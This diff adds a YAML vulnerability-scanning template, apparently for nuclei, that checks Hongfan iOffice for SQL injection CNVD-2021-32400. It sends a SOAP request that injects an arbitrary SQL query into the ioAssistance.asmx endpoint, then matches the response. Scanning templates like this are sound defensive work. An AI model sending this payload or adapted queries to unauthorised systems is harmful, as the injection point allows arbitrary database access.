@@ -1,0 +1,30 @@
+id: yaml-poc-hongfan-ioffice-sql_injection-CNVD-2021-32400
+info:
+  name: Yaml Poc Hongfan Ioffice Sql_Injection Cnvd 2021 32400
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-hongfan-ioffice-sql_injection-CNVD-2021-32400'
+  tags: sqli
+  reference:
+  - http://www.ioffice.cn/newsinfo/1616026.html
+http:
+- method: POST
+  path:
+  - /ioffice/prg/set/wss/ioAssistance.asmx
+  body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"\
+    http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
+    \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\
+    \n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n      <sql>select\
+    \ SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{r1}}')),3,32)</sql>\r\n\
+    \    </GetLoginedEmpNoReadedInf>\r\n  </soap:Body>\r\n</soap:Envelope>"
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <Column1>
